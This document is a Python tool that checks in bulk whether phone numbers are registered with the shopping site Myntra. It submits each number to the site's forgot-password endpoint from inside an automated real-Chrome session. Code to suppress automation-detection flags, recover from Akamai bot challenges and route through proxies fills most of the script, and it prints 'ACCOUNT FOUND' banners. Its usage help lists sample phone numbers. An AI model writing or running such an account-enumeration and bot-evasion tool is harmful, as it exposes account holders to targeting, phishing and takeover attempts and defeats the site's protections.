#!/usr/bin/env python3
"""
Myntra checker — same technique that worked (real Chrome profile + page fetch)
- One browser session per run (bulk = many numbers, one window)
- Auto-heal on challenge (reload /forgot, re-fetch)
- --warmup to refresh profile
- Works for single + bulk
"""

from __future__ import annotations

import argparse
import asyncio
import json
import sys
import time
import uuid
from pathlib import Path
from typing import Any

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

BASE = Path(__file__).resolve().parent
STATE_FILE = BASE / "myntra_state.json"
PROFILE_DIR = BASE / "myntra_chrome_profile"
META_FILE = BASE / "myntra_session_meta.json"

BULK_DELAY = 0.35
HEAL_WAIT = 3.0


def normalize_mobile(mobile: str) -> str:
    digits = "".join(c for c in str(mobile) if c.isdigit())
    return digits[-10:] if len(digits) >= 10 else digits


def decide(http_status: int, data: Any) -> str:
    if not isinstance(data, dict):
        return "UNKNOWN"
    if data.get("sec-cp-challenge") or data.get("provider") == "crypto" or http_status == 428:
        return "CHALLENGE"

    raw_text = data.get("raw_text", "")
    if list(data.keys()) == ["raw_text"]:
        lower = raw_text.lower()
        if any(x in lower for x in ("<html", "challenge", "captcha", "cloudflare", "cf-ray",
                                     "just a moment", "checking your browser", "enable javascript", "site maintenance")):
            return "CHALLENGE"
        return "UNKNOWN"

    code = data.get("code")
    msg = (data.get("message") or "").lower()
    if code == 2002 or "does not exist" in msg:
        return "NOT_REGISTERED"
    if code == 2030:
        return "REGISTERED"
    if http_status == 200:
        return "REGISTERED"
    if any(x in msg for x in ("email", "password", "otp", "recover")) and "does not exist" not in msg:
        return "REGISTERED"
    return "UNKNOWN"


def save_meta(ok: bool, note: str = ""):
    META_FILE.write_text(
        json.dumps(
            {"ok": ok, "note": note, "ts": int(time.time()), "iso": time.strftime("%Y-%m-%d %H:%M:%S")},
            indent=2,
        ),
        encoding="utf-8",
    )


async def open_context(playwright, headless: bool = False, proxy: str = ""):
    """Same technique: persistent real Chrome profile."""
    PROFILE_DIR.mkdir(parents=True, exist_ok=True)
    is_linux = sys.platform.startswith("linux")
    launch_args = [
        "--disable-blink-features=AutomationControlled",
        "--disable-http2",
    ]
    if is_linux:
        launch_args.extend(["--no-sandbox", "--disable-dev-shm-usage"])
    elif headless:
        launch_args.append("--window-position=-10000,-10000")

    proxy_cfg = {"server": proxy} if proxy else None

    context = await playwright.chromium.launch_persistent_context(
        user_data_dir=str(PROFILE_DIR),
        channel="chrome",
        headless=is_linux if is_linux else False,
        viewport={"width": 1366, "height": 768},
        locale="en-IN",
        timezone_id="Asia/Kolkata",
        args=launch_args,
        proxy=proxy_cfg,
    )
    page = context.pages[0] if context.pages else await context.new_page()
    return context, page


async def ensure_forgot_page(page) -> None:
    """Navigate to /forgot; ignore soft failures."""
    try:
        await page.goto(
            "https://www.myntra.com/forgot",
            wait_until="domcontentloaded",
            timeout=60000,
        )
        await page.wait_for_timeout(2000)
    except Exception as e:
        print(f"[!] goto warning: {e}")


async def heal_challenge(page) -> None:
    """Full Akamai challenge recovery: homepage -> JS sensor -> /forgot."""
    try:
        await page.goto(
            "https://www.myntra.com/",
            wait_until="domcontentloaded",
            timeout=60000,
        )
        await page.wait_for_timeout(5000)
    except Exception as e:
        print(f"[!] heal homepage warning: {e}")
    await ensure_forgot_page(page)


async def api_call(page, mobile: str) -> dict:
    """Exact working technique: fetch inside page with profile cookies."""
    device_id = str(uuid.uuid4())
    api = await page.evaluate(
        """async ({ mobile, deviceId }) => {
            try {
                const res = await fetch(
                    'https://www.myntra.com/gateway/auth/v1/forgetpassword',
                    {
                        method: 'POST',
                        credentials: 'include',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': '*/*',
                            'Origin': 'https://www.myntra.com',
                            'Referer': 'https://www.myntra.com/forgot',
                            'x-myntraweb': 'Yes',
                            'x-requested-with': 'browser',
                            'deviceid': deviceId,
                            'x-meta-app': 'deviceId=' + deviceId + ';reqChannel=web;channel=web;'
                        },
                        body: JSON.stringify({ phoneNumber: mobile })
                    }
                );
                const text = await res.text();
                let json = null;
                try { json = JSON.parse(text); } catch (e) {}
                return { http: res.status, json, text: text.slice(0, 500) };
            } catch (e) {
                return { error: e.toString() };
            }
        }""",
        {"mobile": mobile, "deviceId": device_id},
    )

    if not api or api.get("error"):
        return {
            "status": "ERROR",
            "mobile": mobile,
            "error": (api or {}).get("error", "empty"),
        }

    data = api.get("json") or {"raw_text": api.get("text")}
    http_status = api.get("http") or 0
    status = decide(http_status, data if isinstance(data, dict) else {})
    return {
        "status": status,
        "mobile": mobile,
        "http": http_status,
        "raw": data,
        "via": "playwright",
    }


async def check_with_heal(page, mobile: str, max_heal: int = 3) -> dict:
    """Call API; on CHALLENGE reload /forgot and retry."""
    last = None
    for attempt in range(1, max_heal + 1):
        r = await api_call(page, mobile)
        last = r
        if r.get("status") in ("REGISTERED", "NOT_REGISTERED"):
            save_meta(True, "ok")
            return r
        if r.get("status") == "CHALLENGE":
            save_meta(False, "challenge")
            if attempt == 1:
                print(f"    heal {attempt}/{max_heal}: reload /forgot ...")
                await ensure_forgot_page(page)
                await page.wait_for_timeout(int(HEAL_WAIT * 1000))
            else:
                print(f"    heal {attempt}/{max_heal}: full homepage reload ...")
                await heal_challenge(page)
            continue
        if r.get("status") == "ERROR":
            await ensure_forgot_page(page)
            await page.wait_for_timeout(1500)
            continue
        break
    return last or {"status": "ERROR", "mobile": mobile, "error": "no result"}


class MyntraChecker:
    """Persistent Myntra Chrome checker instance."""

    def __init__(self) -> None:
        self._playwright = None
        self._context    = None
        self._page       = None
        self._lock       = asyncio.Lock()
        self._ready      = False

    async def startup(self, headless: bool = False, proxy: str = "") -> None:
        if self._ready and self._page:
            return
        from playwright.async_api import async_playwright
        self._playwright = await async_playwright().start()
        self._context, self._page = await open_context(self._playwright, headless=headless, proxy=proxy)
        await ensure_forgot_page(self._page)
        self._ready = True

    async def shutdown(self) -> None:
        if self._context:
            try:
                if self._page and not self._page.is_closed():
                    await self._context.storage_state(path=str(STATE_FILE))
            except Exception:
                pass
            try:
                await self._context.close()
            except Exception:
                pass
        if self._playwright:
            try:
                await self._playwright.stop()
            except Exception:
                pass
        self._ready = False
        self._page = None
        self._context = None
        self._playwright = None

    async def check_number(self, mobile: str) -> dict:
        if not self._ready or self._page is None:
            await self.startup()
        async with self._lock:
            return await check_with_heal(self._page, mobile)

    async def reload_page(self) -> None:
        if self._ready and self._page:
            async with self._lock:
                await ensure_forgot_page(self._page)

    @property
    def is_ready(self) -> bool:
        return self._ready


myntra_checker = MyntraChecker()


async def check_myntra(mobile: str) -> dict:
    """Check a single mobile number against Myntra."""
    return await myntra_checker.check_number(mobile)


async def warmup(headless: bool = False) -> bool:
    from playwright.async_api import async_playwright

    print("[*] Warmup (real Chrome profile)...")
    async with async_playwright() as p:
        context, page = await open_context(p, headless=headless)
        await ensure_forgot_page(page)
        if not headless:
            print("    Confirm Reset Password page, then press ENTER...")
            await asyncio.get_event_loop().run_in_executor(None, input)
        else:
            await page.wait_for_timeout(5000)
        await context.storage_state(path=str(STATE_FILE))
        await context.close()
    save_meta(True, "warmup")
    print(f"[+] Saved {STATE_FILE}")
    return True


async def run_bulk(numbers: list[str], headless: bool = False) -> list[dict]:
    """ONE browser for entire bulk — same technique, no reopen per number."""
    from playwright.async_api import async_playwright

    results = []
    async with async_playwright() as p:
        context, page = await open_context(p, headless=headless)
        await ensure_forgot_page(page)

        for i, raw in enumerate(numbers, 1):
            mobile = normalize_mobile(raw)
            if len(mobile) != 10:
                results.append({"status": "ERROR", "mobile": raw, "error": "bad number"})
                continue

            print(f"[{i}/{len(numbers)}] {mobile} ...", end=" ", flush=True)
            r = await check_with_heal(page, mobile)
            results.append(r)
            print(r.get("status"))

            if r.get("status") == "CHALLENGE":
                print("[!] Still challenged after heal — run --warmup")
                break

            if i < len(numbers):
                await page.wait_for_timeout(int(BULK_DELAY * 1000))

        # persist cookies for next run
        try:
            await context.storage_state(path=str(STATE_FILE))
        except Exception:
            pass
        await context.close()

    return results


def pretty(result: dict):
    status = result.get("status")
    mobile = result.get("mobile")
    if status == "REGISTERED":
        print(f"""
❰ ✅ 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗙𝗢𝗨𝗡𝗗 🎯 ❱
┏━━━━━━━━━━━━━━━━━━━━┓
✓ sᴛᴀᴛᴜs ʀᴇɢɪsᴛᴇʀᴇᴅ
🎯 ᴘʟᴀᴛғᴏʀᴍ 📦 ᴍʏɴᴛʀᴀ
📱 ɴᴜᴍʙᴇʀ {mobile}
┗━━━━━━━━━━━━━━━━━━━━┛
""")
    elif status == "NOT_REGISTERED":
        print(f"""
❰ ❌ 𝗡𝗢𝗧 𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥𝗘𝗗 ❱
┏━━━━━━━━━━━━━━━━━━━━┓
✗ sᴛᴀᴛᴜs ᴜɴʀᴇɢɪsᴛᴇʀᴇᴅ
🎯 ᴘʟᴀᴛғᴏʀᴍ 📦 ᴍʏɴᴛʀᴀ
📱 ɴᴜᴍʙᴇʀ {mobile}
┗━━━━━━━━━━━━━━━━━━━━┛
""")
    else:
        print("Result:", result)


def main():
    ap = argparse.ArgumentParser(description="Myntra checker (Playwright Chrome profile)")
    ap.add_argument("numbers", nargs="*", help="mobile numbers")
    ap.add_argument("-f", "--file", help="file with numbers")
    ap.add_argument("--warmup", action="store_true")
    ap.add_argument("--headless", action="store_true", help="try headless (may challenge)")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--status", action="store_true")
    args = ap.parse_args()

    if args.status:
        meta = {}
        if META_FILE.exists():
            meta = json.loads(META_FILE.read_text(encoding="utf-8"))
        print(json.dumps({
            "state_file": STATE_FILE.exists(),
            "profile_dir": PROFILE_DIR.is_dir(),
            "meta": meta,
        }, indent=2))
        return

    if args.warmup:
        asyncio.run(warmup(headless=args.headless))
        return

    numbers: list[str] = []
    if args.file:
        numbers = [
            ln.strip()
            for ln in Path(args.file).read_text(encoding="utf-8").splitlines()
            if ln.strip()
        ]
    numbers.extend(args.numbers)
    if not numbers:
        ap.print_help()
        print("\n  python myntra_check.py --warmup")
        print("  python myntra_check.py 9927936712")
        print("  python myntra_check.py 9927936712 9027936246 8891523001")
        sys.exit(1)

    # Default: headless=False (same as the run that worked)
    results = asyncio.run(run_bulk(numbers, headless=args.headless))

    if args.json:
        print(json.dumps(results, indent=2, default=str))
    elif len(results) == 1:
        pretty(results[0])
    else:
        print("\n===== SUMMARY =====")
        for r in results:
            print(f"{r.get('mobile')}\t{r.get('status')}")


if __name__ == "__main__":
    main()